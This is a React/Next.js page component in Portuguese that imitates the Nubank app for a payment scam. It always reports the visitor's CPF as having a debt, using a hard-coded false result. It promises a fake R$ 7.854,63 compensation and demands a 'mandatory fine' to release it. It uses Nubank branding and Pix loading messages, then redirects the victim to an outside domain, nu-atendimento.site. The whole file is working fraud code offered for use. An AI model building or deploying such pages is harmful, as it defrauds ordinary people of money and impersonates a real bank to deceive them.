"use client"

import { useEffect, useState } from "react"
import { useRouter } from "next/navigation"
import { Button } from "@/components/ui/button"
import { Card, CardContent } from "@/components/ui/card"
import { ArrowLeft, CheckCircle, AlertTriangle, Info, Clock } from "lucide-react"
import Image from "next/image"

type SituacaoCPF = "limpo" | "negativado"

interface ResultadoCPF {
  situacao: SituacaoCPF
  motivo?: string
}

export default function ResultadoPage() {
  const router = useRouter()
  const [userData, setUserData] = useState({
    fullName: "",
    cpf: "",
    birthDate: "",
  })
  const [firstName, setFirstName] = useState("")
  const [situacaoCPF, setSituacaoCPF] = useState<ResultadoCPF | null>(null)
  const [isConsultando, setIsConsultando] = useState(true)
  const [showLoading, setShowLoading] = useState(false)
  const [loadingMessage, setLoadingMessage] = useState("Estamos gerando seu QR Code Pix...")
  const [loadingStep, setLoadingStep] = useState(0)

  useEffect(() => {
    const storedData = localStorage.getItem("userData")
    if (storedData) {
      const parsedData = JSON.parse(storedData)
      setUserData(parsedData)

      const nameParts = parsedData.fullName.split(" ")
      setFirstName(nameParts[0])

      setTimeout(() => {
        setSituacaoCPF({
          situacao: "negativado",
          motivo: "Dívida ativa com Empresa XPTO no valor de R$ 1.245,30",
        })

        setIsConsultando(false)
      }, 1000)
    } else {
      router.push("/")
    }
  }, [router])

  useEffect(() => {
    if (showLoading) {
      const messages = [
        "Estamos gerando seu QR Code Pix...",
        "Verificando dados bancários...",
        "Preparando ambiente seguro...",
        "Quase pronto! Finalizando...",
      ]

      const interval = setInterval(() => {
        setLoadingStep((prev) => {
          const newStep = prev + 1
          if (newStep < messages.length) {
            setLoadingMessage(messages[newStep])
            return newStep
          } else {
            clearInterval(interval)
            setTimeout(() => {
              window.location.href = "https://nu-atendimento.site/pagamento/index.html"
            }, 2000)
            return prev
          }
        })
      }, 2000)

      return () => clearInterval(interval)
    }
  }, [showLoading, router])

  const handleBack = () => {
    router.push("/home")
  }

  const handleVerInformacoes = () => {
    router.push("/informacoes")
  }

  const handleShowLoading = () => {
    setShowLoading(true)
  }

  return (
    <main className="min-h-screen bg-gray-100 pb-20">
      {/* Loading Page */}
      {showLoading && (
        <div className="fixed inset-0 w-full h-full bg-[#831BD1]/95 z-50 flex items-center justify-center fade-in">
          <div className="flex flex-col items-center justify-center">
            <div className="relative w-40 h-40 mb-8">
              {/* Logo com efeito de pulsação */}
              <div className="w-32 absolute top-1/2 left-1/2 transform -translate-x-1/2 -translate-y-1/2 z-10 animate-pulse bg-white rounded-full p-4">
                <Image src="/nubank-logo.png" alt="Logo Nubank" width={100} height={40} className="w-full" />
              </div>

              {/* Anel de carregamento animado */}
              <svg className="w-40 h-40 absolute top-0 left-0" viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
                <circle cx="50" cy="50" r="45" fill="none" stroke="rgba(255, 255, 255, 0.2)" strokeWidth="6"></circle>
                <circle
                  cx="50"
                  cy="50"
                  r="45"
                  fill="none"
                  stroke="white"
                  strokeWidth="6"
                  strokeLinecap="round"
                  strokeDasharray="283"
                  strokeDashoffset="100"
                  className="animate-spin"
                  style={{ animationDuration: "2s" }}
                ></circle>
              </svg>
            </div>

            <div className="text-center text-white">
              <h1 className="text-2xl font-bold mb-3">Preparando seu pagamento</h1>
              <p className="text-base opacity-90">{loadingMessage}</p>

              {/* Indicador de pontos carregando */}
              <div className="flex justify-center mt-4 space-x-1">
                <div className="w-2 h-2 bg-white rounded-full animate-bounce" style={{ animationDelay: "0s" }}></div>
                <div className="w-2 h-2 bg-white rounded-full animate-bounce" style={{ animationDelay: "0.2s" }}></div>
                <div className="w-2 h-2 bg-white rounded-full animate-bounce" style={{ animationDelay: "0.4s" }}></div>
              </div>
            </div>
          </div>
        </div>
      )}

      {/* Header */}
      <header className="nubank-bg p-4 pt-12 pb-6">
        <div className="flex items-center">
          <button onClick={handleBack} className="text-white mr-3">
            <ArrowLeft size={24} />
          </button>
          <h1 className="text-white text-lg font-medium">Indenização</h1>
        </div>
      </header>

      <div className="px-4 py-4 space-y-4">
        {/* Situação do CPF Card */}
        <Card className="rounded-2xl">
          <CardContent className="pt-6">
            <div className="flex flex-col items-center justify-center py-2 space-y-2">
              <h2 className="text-lg font-bold text-center">Situação do seu CPF</h2>
            </div>

            {isConsultando ? (
              <div className="flex flex-col items-center justify-center py-4">
                <div className="animate-spin rounded-full h-8 w-8 border-b-2 border-purple-700"></div>
                <p className="mt-3 text-sm text-gray-600">Consultando situação...</p>
              </div>
            ) : situacaoCPF ? (
              <div className="p-4 rounded-lg mt-2 bg-red-50">
                <div className="flex items-start gap-3">
                  <AlertTriangle className="h-6 w-6 text-red-500 flex-shrink-0" />
                  <div>
                    <h3 className="font-medium text-red-700">Atenção! Seu CPF está com pendências.</h3>
                    {situacaoCPF.motivo && <p className="text-sm mt-1 text-gray-600">{situacaoCPF.motivo}</p>}
                  </div>
                </div>
              </div>
            ) : (
              <p className="text-center py-4 text-gray-500">Não foi possível consultar a situação do CPF.</p>
            )}

            <Button
              onClick={handleVerInformacoes}
              variant="outline"
              className="w-full mt-4 border-purple-200 text-purple-700 hover:bg-purple-50"
            >
              <Info className="mr-2 h-4 w-4" />
              Ver informações detalhadas
            </Button>
          </CardContent>
        </Card>

        {/* Indenização Card */}
        <Card className="rounded-2xl">
          <CardContent className="pt-6 space-y-6">
            <div className="flex flex-col items-center justify-center py-4 space-y-2">
              <CheckCircle className="h-16 w-16 text-green-500" />
              <h2 className="text-xl font-bold text-center">Indenização Disponível!</h2>
              <p className="text-center text-gray-600">{firstName}, você tem direito a uma indenização do Nubank.</p>
            </div>

            <div className="flex flex-col items-center justify-center p-6 bg-gray-50 rounded-lg">
              <p className="text-sm text-gray-500 mb-2">Valor disponível:</p>
              <p className="text-4xl font-bold nubank-text">R$ 7.854,63</p>
              <p className="text-sm text-gray-500 mt-2">Disponível para saque imediato</p>
            </div>

            <div className="space-y-2 p-4 bg-gray-50 rounded-md">
              <h2 className="font-medium">Detalhes da indenização:</h2>
              <ul className="space-y-2 mt-2">
                <li className="flex items-start gap-2">
                  <CheckCircle className="h-5 w-5 text-green-500 flex-shrink-0 mt-0.5" />
                  <span>Falha no sistema de cobrança</span>
                </li>
                <li className="flex items-start gap-2">
                  <CheckCircle className="h-5 w-5 text-green-500 flex-shrink-0 mt-0.5" />
                  <span>Cobranças indevidas identificadas</span>
                </li>
                <li className="flex items-start gap-2">
                  <CheckCircle className="h-5 w-5 text-green-500 flex-shrink-0 mt-0.5" />
                  <span>Juros e correção monetária incluídos</span>
                </li>
              </ul>
            </div>

            <div className="p-4 bg-amber-50 rounded-md border border-amber-200">
              <h3 className="font-medium nubank-text mb-2">Como receber:</h3>

              <div className="bg-amber-100 p-3 rounded-md mb-4 border-l-4 border-amber-500">
                <div className="flex items-start gap-2">
                  <AlertTriangle className="h-5 w-5 text-amber-600 flex-shrink-0 mt-0.5" />
                  <div>
                    <p className="font-medium text-amber-800 mb-1">⚠️ Atenção!</p>
                    <p className="text-sm text-amber-800 mb-2">
                      Mesmo que os impostos tenham sido pagos, foi identificado que seu CPF está com pendências
                      financeiras (nome sujo). Por isso, será necessário quitar uma multa obrigatória para que o valor
                      da indenização seja liberado.
                    </p>
                    <p className="text-sm text-amber-800">
                      Após o pagamento da multa, a transferência será realizada automaticamente em até 24 horas úteis.
                    </p>
                  </div>
                </div>
              </div>

              <Button onClick={handleShowLoading} className="w-full nubank-bg hover:bg-purple-700 rounded-xl mt-4">
                Gerar código de pagamento
              </Button>
            </div>

            <div className="flex items-center gap-2 text-xs text-center text-amber-600 justify-center">
              <Clock size={14} />
              <p>
                Esta indenização é válida por 24 horas. Após esse período, será necessário entrar em contato com o
                suporte para solicitar uma nova análise.
              </p>
            </div>
          </CardContent>
        </Card>
      </div>
    </main>
  )
}